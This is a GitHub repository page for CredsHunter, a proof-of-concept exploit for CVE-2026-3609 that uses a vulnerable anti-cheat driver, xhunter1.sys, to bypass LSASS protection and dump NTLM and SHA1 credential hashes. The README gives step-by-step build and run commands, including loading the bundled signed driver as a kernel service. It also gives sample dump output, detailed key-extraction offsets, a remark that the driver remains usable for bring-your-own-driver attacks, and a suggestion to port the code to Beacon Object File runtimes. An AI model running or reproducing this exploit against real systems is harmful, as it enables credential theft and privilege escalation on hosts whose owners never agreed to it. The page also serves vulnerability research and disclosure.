# https://github.com/BlackSnufkin/CredsHunter

[Skip to content](https://github.com/BlackSnufkin/CredsHunter#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/BlackSnufkin/CredsHunter) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/BlackSnufkin/CredsHunter) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/BlackSnufkin/CredsHunter) to refresh your session.Dismiss alert

{{ message }}

[BlackSnufkin](https://github.com/BlackSnufkin)/ **[CredsHunter](https://github.com/BlackSnufkin/CredsHunter)** Public

- [Notifications](https://github.com/login?return_to=%2FBlackSnufkin%2FCredsHunter) You must be signed in to change notification settings
- [Fork\\
2](https://github.com/login?return_to=%2FBlackSnufkin%2FCredsHunter)
- [Star\\
25](https://github.com/login?return_to=%2FBlackSnufkin%2FCredsHunter)


main

[**1** Branch](https://github.com/BlackSnufkin/CredsHunter/branches) [**0** Tags](https://github.com/BlackSnufkin/CredsHunter/tags)

[Go to Branches page](https://github.com/BlackSnufkin/CredsHunter/branches)[Go to Tags page](https://github.com/BlackSnufkin/CredsHunter/tags)

Go to file

Code

Open more actions menu

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| ## Latest commit<br>[![BlackSnufkin](https://avatars.githubusercontent.com/u/61916899?v=4&size=40)](https://github.com/BlackSnufkin)[BlackSnufkin](https://github.com/BlackSnufkin/CredsHunter/commits?author=BlackSnufkin)<br>[Initial CredsHunter PoC for](https://github.com/BlackSnufkin/CredsHunter/commit/dd3ba9d9bb9e00099d8ea5b5d65f3a19193c228f) [CVE-2026-3609](https://github.com/advisories/GHSA-4gcg-jv45-v47x "CVE-2026-3609")<br>Open commit details<br>last monthMay 12, 2026<br>[dd3ba9d](https://github.com/BlackSnufkin/CredsHunter/commit/dd3ba9d9bb9e00099d8ea5b5d65f3a19193c228f) · last monthMay 12, 2026<br>## History<br>[2 Commits](https://github.com/BlackSnufkin/CredsHunter/commits/main/) <br>Open commit details<br>[View commit history for this file.](https://github.com/BlackSnufkin/CredsHunter/commits/main/) 2 Commits |
| [src](https://github.com/BlackSnufkin/CredsHunter/tree/main/src "src") | [src](https://github.com/BlackSnufkin/CredsHunter/tree/main/src "src") | [Initial CredsHunter PoC for](https://github.com/BlackSnufkin/CredsHunter/commit/dd3ba9d9bb9e00099d8ea5b5d65f3a19193c228f "Initial CredsHunter PoC for CVE-2026-3609  Rust implementation of the LSASS credential dump primitive against xhunter1.sys (XIGNCODE3 anti-cheat). Uses command 785 to obtain a PPL-bypassing PROCESS_ALL_ACCESS handle via ObOpenObjectByPointer with AccessMode=KernelMode and no OBJ_KERNEL_HANDLE, then walks LSA crypto material and decrypts the LogonSessionList.  Modules: - driver: Xhunter / Session wrappers + MemReader trait - proc:   PID lookup + PEB-walk remote module discovery - pe:     local PE parsing and pattern scan helpers - lsa:    LSA key pattern table + BCrypt key extraction + 3DES - logon:  LogonSessionList walker + MSV1_0 offsets - wdigest: WDigest credential list walker (best-effort) - sys:    OS build number  Affected driver bundled:   xhunter1.sys 10.0.10011.16384   SHA-256 e727d0753d2cd0b2f6eeba4cea53aa10b3ff3ed2afeb78f545fcf6d840f85c3e") [CVE-2026-3609](https://github.com/advisories/GHSA-4gcg-jv45-v47x "CVE-2026-3609") | last monthMay 12, 2026 |
| [.gitignore](https://github.com/BlackSnufkin/CredsHunter/blob/main/.gitignore ".gitignore") | [.gitignore](https://github.com/BlackSnufkin/CredsHunter/blob/main/.gitignore ".gitignore") | [Initial commit](https://github.com/BlackSnufkin/CredsHunter/commit/dc5194ef2da0cefd0c3d72460ba4b43a24ab9019 "Initial commit") | last monthMay 12, 2026 |
| [Cargo.lock](https://github.com/BlackSnufkin/CredsHunter/blob/main/Cargo.lock "Cargo.lock") | [Cargo.lock](https://github.com/BlackSnufkin/CredsHunter/blob/main/Cargo.lock "Cargo.lock") | [Initial CredsHunter PoC for](https://github.com/BlackSnufkin/CredsHunter/commit/dd3ba9d9bb9e00099d8ea5b5d65f3a19193c228f "Initial CredsHunter PoC for CVE-2026-3609  Rust implementation of the LSASS credential dump primitive against xhunter1.sys (XIGNCODE3 anti-cheat). Uses command 785 to obtain a PPL-bypassing PROCESS_ALL_ACCESS handle via ObOpenObjectByPointer with AccessMode=KernelMode and no OBJ_KERNEL_HANDLE, then walks LSA crypto material and decrypts the LogonSessionList.  Modules: - driver: Xhunter / Session wrappers + MemReader trait - proc:   PID lookup + PEB-walk remote module discovery - pe:     local PE parsing and pattern scan helpers - lsa:    LSA key pattern table + BCrypt key extraction + 3DES - logon:  LogonSessionList walker + MSV1_0 offsets - wdigest: WDigest credential list walker (best-effort) - sys:    OS build number  Affected driver bundled:   xhunter1.sys 10.0.10011.16384   SHA-256 e727d0753d2cd0b2f6eeba4cea53aa10b3ff3ed2afeb78f545fcf6d840f85c3e") [CVE-2026-3609](https://github.com/advisories/GHSA-4gcg-jv45-v47x "CVE-2026-3609") | last monthMay 12, 2026 |
| [Cargo.toml](https://github.com/BlackSnufkin/CredsHunter/blob/main/Cargo.toml "Cargo.toml") | [Cargo.toml](https://github.com/BlackSnufkin/CredsHunter/blob/main/Cargo.toml "Cargo.toml") | [Initial CredsHunter PoC for](https://github.com/BlackSnufkin/CredsHunter/commit/dd3ba9d9bb9e00099d8ea5b5d65f3a19193c228f "Initial CredsHunter PoC for CVE-2026-3609  Rust implementation of the LSASS credential dump primitive against xhunter1.sys (XIGNCODE3 anti-cheat). Uses command 785 to obtain a PPL-bypassing PROCESS_ALL_ACCESS handle via ObOpenObjectByPointer with AccessMode=KernelMode and no OBJ_KERNEL_HANDLE, then walks LSA crypto material and decrypts the LogonSessionList.  Modules: - driver: Xhunter / Session wrappers + MemReader trait - proc:   PID lookup + PEB-walk remote module discovery - pe:     local PE parsing and pattern scan helpers - lsa:    LSA key pattern table + BCrypt key extraction + 3DES - logon:  LogonSessionList walker + MSV1_0 offsets - wdigest: WDigest credential list walker (best-effort) - sys:    OS build number  Affected driver bundled:   xhunter1.sys 10.0.10011.16384   SHA-256 e727d0753d2cd0b2f6eeba4cea53aa10b3ff3ed2afeb78f545fcf6d840f85c3e") [CVE-2026-3609](https://github.com/advisories/GHSA-4gcg-jv45-v47x "CVE-2026-3609") | last monthMay 12, 2026 |
| [LICENSE](https://github.com/BlackSnufkin/CredsHunter/blob/main/LICENSE "LICENSE") | [LICENSE](https://github.com/BlackSnufkin/CredsHunter/blob/main/LICENSE "LICENSE") | [Initial commit](https://github.com/BlackSnufkin/CredsHunter/commit/dc5194ef2da0cefd0c3d72460ba4b43a24ab9019 "Initial commit") | last monthMay 12, 2026 |
| [README.md](https://github.com/BlackSnufkin/CredsHunter/blob/main/README.md "README.md") | [README.md](https://github.com/BlackSnufkin/CredsHunter/blob/main/README.md "README.md") | [Initial CredsHunter PoC for](https://github.com/BlackSnufkin/CredsHunter/commit/dd3ba9d9bb9e00099d8ea5b5d65f3a19193c228f "Initial CredsHunter PoC for CVE-2026-3609  Rust implementation of the LSASS credential dump primitive against xhunter1.sys (XIGNCODE3 anti-cheat). Uses command 785 to obtain a PPL-bypassing PROCESS_ALL_ACCESS handle via ObOpenObjectByPointer with AccessMode=KernelMode and no OBJ_KERNEL_HANDLE, then walks LSA crypto material and decrypts the LogonSessionList.  Modules: - driver: Xhunter / Session wrappers + MemReader trait - proc:   PID lookup + PEB-walk remote module discovery - pe:     local PE parsing and pattern scan helpers - lsa:    LSA key pattern table + BCrypt key extraction + 3DES - logon:  LogonSessionList walker + MSV1_0 offsets - wdigest: WDigest credential list walker (best-effort) - sys:    OS build number  Affected driver bundled:   xhunter1.sys 10.0.10011.16384   SHA-256 e727d0753d2cd0b2f6eeba4cea53aa10b3ff3ed2afeb78f545fcf6d840f85c3e") [CVE-2026-3609](https://github.com/advisories/GHSA-4gcg-jv45-v47x "CVE-2026-3609") | last monthMay 12, 2026 |
| [xhunter1.sys](https://github.com/BlackSnufkin/CredsHunter/blob/main/xhunter1.sys "xhunter1.sys") | [xhunter1.sys](https://github.com/BlackSnufkin/CredsHunter/blob/main/xhunter1.sys "xhunter1.sys") | [Initial CredsHunter PoC for](https://github.com/BlackSnufkin/CredsHunter/commit/dd3ba9d9bb9e00099d8ea5b5d65f3a19193c228f "Initial CredsHunter PoC for CVE-2026-3609  Rust implementation of the LSASS credential dump primitive against xhunter1.sys (XIGNCODE3 anti-cheat). Uses command 785 to obtain a PPL-bypassing PROCESS_ALL_ACCESS handle via ObOpenObjectByPointer with AccessMode=KernelMode and no OBJ_KERNEL_HANDLE, then walks LSA crypto material and decrypts the LogonSessionList.  Modules: - driver: Xhunter / Session wrappers + MemReader trait - proc:   PID lookup + PEB-walk remote module discovery - pe:     local PE parsing and pattern scan helpers - lsa:    LSA key pattern table + BCrypt key extraction + 3DES - logon:  LogonSessionList walker + MSV1_0 offsets - wdigest: WDigest credential list walker (best-effort) - sys:    OS build number  Affected driver bundled:   xhunter1.sys 10.0.10011.16384   SHA-256 e727d0753d2cd0b2f6eeba4cea53aa10b3ff3ed2afeb78f545fcf6d840f85c3e") [CVE-2026-3609](https://github.com/advisories/GHSA-4gcg-jv45-v47x "CVE-2026-3609") | last monthMay 12, 2026 |
| View all files |

## Repository files navigation

# CredsHunter

[Permalink: CredsHunter](https://github.com/BlackSnufkin/CredsHunter#credshunter)

[**CVE-2026-3609**](https://nvd.nist.gov/vuln/detail/CVE-2026-3609) · [**Writeup**](https://blacksnufkin.github.io/posts/AntiCheat-LPE-CVE-2026-3609/)

LSASS credential dump proof-of-concept for a PPL-bypassing process-handle leak in Wellbia's XIGNCODE3 anti-cheat driver, `xhunter1.sys`.

The driver exposes an `IRP_MJ_WRITE` command interface that calls `ObOpenObjectByPointer` with `AccessMode = KernelMode` and without `OBJ_KERNEL_HANDLE`, dropping a kernel-minted `PROCESS_ALL_ACCESS` handle straight into the caller's handle table. From there, standard credential-dumping code reads `lsasrv.dll`'s 3DES key out of the target and recovers NTLM + SHA1 hashes for every active logon session.

## Affected binary

[Permalink: Affected binary](https://github.com/BlackSnufkin/CredsHunter#affected-binary)

```
xhunter1.sys  version 10.0.10011.16384
SHA-256       e727d0753d2cd0b2f6eeba4cea53aa10b3ff3ed2afeb78f545fcf6d840f85c3e
```

The vulnerable signed driver is included in this repo (`xhunter1.sys`) so the exploit is reproducible end-to-end. Verify the hash before loading:

```
Get-FileHash .\xhunter1.sys -Algorithm SHA256
```

Newer XIGNCODE3 releases are patched. The vulnerable signed binary remains usable as a BYOVD primitive on any host where it can be dropped and loaded.

## Build

[Permalink: Build](https://github.com/BlackSnufkin/CredsHunter#build)

```
git clone https://github.com/BlackSnufkin/CredsHunter.git
cd CredsHunter
cargo build --release
```

The release binary is placed at `target\release\CredsHunter.exe`.

## Run

[Permalink: Run](https://github.com/BlackSnufkin/CredsHunter#run)

Load the bundled driver as a kernel service (the driver's device DACL allows any caller once it's running):

```
sc create xhunter type=kernel binPath=(Resolve-Path .\xhunter1.sys)
sc start xhunter
```

Run the tool:

```
.\target\release\CredsHunter.exe
```

To clean up afterwards:

```
sc stop xhunter
sc delete xhunter
```

The default device name is `\\.\xhunter` (matching the example service name above). If your service uses a different name, the device path will follow it — edit `driver::DEFAULT_DEVICE` or call `Xhunter::open_named` accordingly.

## Sample output

[Permalink: Sample output](https://github.com/BlackSnufkin/CredsHunter#sample-output)

```
  xhunter1.sys BYOVD — LSASS credential dump
  CVE-2026-3609 — PPL bypass via cmd 785 (ObOpenObjectByPointer/KernelMode)

[+] OS build .............. 26200
[+] lsass.exe PID ......... 940
[+] Driver opened ......... \\.\xhunter
[+] PPL bypass handle ..... 0x154 (ReadProcessMemory)
[+] lsasrv.dll ............ local 0x00007FFB27CB0000  remote 0x00007FFB27CB0000
[+] LSA key addrs (local) . AES 0x...  3DES 0x...  IV 0x...
[+] 3DES key (24B) ........ <hex>
[+] IV .................... <hex>

===== LogonSessionList =====

[0001] LogonSession @ 0x...
  User   : <username>
  Domain : <domain>
  NTHash : <16 bytes hex>
  SHA1   : <20 bytes hex>

[...]
```

## How it works

[Permalink: How it works](https://github.com/BlackSnufkin/CredsHunter#how-it-works)

| Stage | Component | What happens |
| --- | --- | --- |
| 1 | `driver.rs` → `Xhunter::open` | `CreateFile("\\.\\xhunter")` — no auth on the device |
| 2 | `driver.rs` → `Xhunter::open_process` | `WriteFile` with command 785 (PID, `PROCESS_ALL_ACCESS`). Driver calls `ObOpenObjectByPointer(target, 0, NULL, 0x1FFFFF, PsProcessType, KernelMode, &handle)` and writes the handle back to the user's response buffer at `+0x10`. The handle bypasses PPL because `AccessMode = KernelMode` skips the access check, and it lands in our handle table because `OBJ_KERNEL_HANDLE` is not set. |
| 3 | `driver.rs` → `Session::attach` | Probes `ReadProcessMemory` against the kernel-minted handle. Falls back to driver command 787 (`KeStackAttachProcess` \+ memcpy) if RPM is blocked. |
| 4 | `lsa.rs` | Pattern-scans local `lsasrv.dll`'s `.text` to recover RIP-relative pointers to the AES key, 3DES key, and IV inside `LsaInitializeProtectedMemory`. Rebases those VAs onto the target's mapping, walks `BCRYPT_HANDLE_KEY → BCRYPT_KEY81`, and pulls the raw 3DES bytes out of the target. |
| 5 | `logon.rs` | Walks `LogonSessionList` (per-build sig table). Each entry's primary credential at `+credentials → +0x10 → +0x30` holds a 0x1B0-byte 3DES-encrypted blob. `bcrypt.dll` decrypts it; bytes `70..86` are the NT hash, `102..122` are the SHA1. |

## Project layout

[Permalink: Project layout](https://github.com/BlackSnufkin/CredsHunter#project-layout)

```
src/
├── main.rs       # banner, run flow, ExitCode handling
├── driver.rs     # Xhunter, Session, MemReader trait, protocol constants
├── proc.rs       # find_pid, PEB-walk remote module lookup
├── pe.rs         # local PE parsing + pattern scan + RIP decode
├── lsa.rs        # LSA key patterns, BCrypt key extraction, 3DES decrypt
├── logon.rs      # LogonSessionList walker + MSV1_0 offsets
├── wdigest.rs    # WDigest list walker (best-effort)
└── sys.rs        # OS build number
```

The `MemReader` trait abstracts memory reads so the credential-extraction modules don't depend on the specific driver primitive. Implement the trait on a different reader (e.g. a Beacon Object File runtime, a ptwalk-based phys-mem reader) and the `lsa` / `logon` / `wdigest` modules drop in unchanged.

## Known limitations

[Permalink: Known limitations](https://github.com/BlackSnufkin/CredsHunter#known-limitations)

- **WDigest plaintext recovery is best-effort.** The list-head signature is a single byte pattern (`48 3B D9 74`) inherited from the original public PoC and has not been refreshed for Windows 11 build 26100+. Building this out into a per-build table is straightforward; PRs welcome.
- **Service / device name** is hardcoded to `xhunter`. If you load the driver under a different name, edit `driver::DEFAULT_DEVICE` or pass an override to `Xhunter::open_named`.

## Disclaimer

[Permalink: Disclaimer](https://github.com/BlackSnufkin/CredsHunter#disclaimer)

For research, authorised testing, and defensive tooling only. Loading the vulnerable driver on a system you do not own or have explicit permission to test is a crime in most jurisdictions. The author accepts no responsibility for misuse.

## License

[Permalink: License](https://github.com/BlackSnufkin/CredsHunter#license)

See [`LICENSE`](https://github.com/BlackSnufkin/CredsHunter/blob/main/LICENSE).

## About

PoC for CVE-2026-3609 - XIGNCODE3 xhunter1.sys handle leak enabling PPL bypass and LSASS dumping


### Resources

[Readme](https://github.com/BlackSnufkin/CredsHunter#readme-ov-file)

### License

[GPL-3.0 license](https://github.com/BlackSnufkin/CredsHunter#GPL-3.0-1-ov-file)

### Uh oh!

There was an error while loading. [Please reload this page](https://github.com/BlackSnufkin/CredsHunter).

[Activity](https://github.com/BlackSnufkin/CredsHunter/activity)

### Stars

[**25**\\
stars](https://github.com/BlackSnufkin/CredsHunter/stargazers)

### Watchers

[**1**\\
watching](https://github.com/BlackSnufkin/CredsHunter/watchers)

### Forks

[**2**\\
forks](https://github.com/BlackSnufkin/CredsHunter/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FBlackSnufkin%2FCredsHunter&report=BlackSnufkin+%28user%29)

## [Releases](https://github.com/BlackSnufkin/CredsHunter/releases)

No releases published

## [Packages\  0](https://github.com/users/BlackSnufkin/packages?repo_name=CredsHunter)

No packages published

## [Contributors\  1](https://github.com/BlackSnufkin/CredsHunter/graphs/contributors)

- [![@BlackSnufkin](https://avatars.githubusercontent.com/u/61916899?s=64&v=4)](https://github.com/BlackSnufkin)[**BlackSnufkin** BlackSnufkin](https://github.com/BlackSnufkin)

## Languages

- [Rust100.0%](https://github.com/BlackSnufkin/CredsHunter/search?l=rust)

You can’t perform that action at this time.